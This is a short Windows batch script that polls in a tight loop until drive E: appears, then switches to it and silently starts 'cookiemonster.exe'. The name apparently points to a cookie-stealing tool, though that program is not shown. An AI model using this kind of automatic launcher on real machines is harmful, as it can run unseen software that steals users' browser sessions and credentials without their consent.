@echo off
:ScanLoop
if exist E:\ (goto True) else (goto ScanLoop)

:True
E:
start cookiemonster.exe
goto end

:end
exit
